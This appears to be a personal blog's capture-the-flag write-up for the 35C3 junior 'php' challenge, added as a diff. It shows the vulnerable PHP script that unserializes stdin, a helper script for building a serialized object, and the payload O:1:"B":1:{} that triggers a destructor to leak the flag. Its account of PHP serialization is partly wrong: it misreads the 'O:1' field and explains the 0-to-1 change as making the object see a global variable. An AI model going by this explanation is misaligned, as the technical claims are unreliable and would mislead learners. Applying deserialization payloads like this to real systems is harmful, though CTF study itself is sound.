@@ -1,0 +1,73 @@
+<h1 id="35c3c-ctf-php">35c3c CTF: php</h1>
+<p>I recently participated in the 35c3c ctf. I have enough time to do a quick write up
+and this vulnerability class is intreging to me.</p>
+<h2 id="first-impressions">First impressions</h2>
+<p>When first downloading the included file there is a tar archive with one file.
+The file is a simple php script (the game ran it on a nc server). Opening up the file I can clearly
+see the vaulnarability. Its contents are as follows.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nx">line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span>
+
+<span class="nv">$flag</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
+
+<span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">'Well that was unexpected…'</span><span class="p">);</span>
+
+<span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>The vulnerability is a deserialization bug. That when done right allows us too get the flag.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>This bug is fairly simple to exploit. Since we have source code that we can modify we can echo out to the screen the serialized string of a instance of <code class="highlighter-rouge">class B</code>.
+We do that by modifying the code to this.</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="nv">$line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span>
+
+<span class="nv">$flag</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
+
+<span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">'Well that was unexpected…'</span><span class="p">);</span>
+
+<span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>We then run <code class="highlighter-rouge">php php.php</code> and get the serialized string. <code class="highlighter-rouge">O:1:"B":0:{}</code>. To actually get the program to print the flag
+we have to change the <code class="highlighter-rouge">0</code> in the serialized string too a <code class="highlighter-rouge">1</code>. After that you run the program and paste in <code class="highlighter-rouge">O:1:"B":1:{}</code> into stdin.
+The program responds with the flag text.</p>
+
+<h2 id="how-this-works">How this works.</h2>
+<h3 id="magic-methods-and-deserilization-bugs">Magic methods and deserilization bugs</h3>
+<p>This is a deserilization bug. A deserilization bug occurs when serialized objects are managed incorrectly.
+So when the code calls <code class="highlighter-rouge">unserialize()</code> on a line from stdin it is inherently trusting the user to supply a serialized object.
+That is part one of the vulnerability, what makes deserilization bugs dangerous is the second part. Look at <code class="highlighter-rouge">class B</code>, specifically the <code class="highlighter-rouge">__destruct</code> method.
+<code class="highlighter-rouge">__destruct</code> is a magic method or a method that is run without being called by the programer. In this case it is called when the object is deleted when the runtime determines that the object is nolonger needed.
+By having control over the string that gets passed too <code class="highlighter-rouge">unserialize</code> we can create a new instance of <code class="highlighter-rouge">class B</code> and control its inputs.</p>
+
+<h3 id="php-object-serialization-syntax">Php object serialization syntax</h3>
+<p>This part is something that you need to have a tiny understading of, but not a large one.
+Our exploit for the serialized object is <code class="highlighter-rouge">O:1:"B":1:{}</code> but the program prints out <code class="highlighter-rouge">O:1:"B":0:{}</code> when echo out the serialized text.
+To put this simply the string starts with an <code class="highlighter-rouge">O</code> for object then is followed by a <code class="highlighter-rouge">:</code> which acts a seperator. The number after the separator is the number of arguments that <code class="highlighter-rouge">class B</code> takes. After that we have a <code class="highlighter-rouge">"B"</code> which means its a <code class="highlighter-rouge">class B</code> object. Followed by another seperator and then the “magic” part.
+This number is the amount values in <code class="highlighter-rouge">class B</code>. When we call <code class="highlighter-rouge">serialize</code> on our instance of <code class="highlighter-rouge">class B</code> it removes the global variable from the serialized text. By manually manipulating that value from a <code class="highlighter-rouge">0</code> to a <code class="highlighter-rouge">1</code> we are able to have our object recognized the global variable.
+If you want a more indepth explination of php serialization check out <a href="http://www.phpinternalsbook.com/classes_objects/serialization.html">php internals</a>.</p>
+
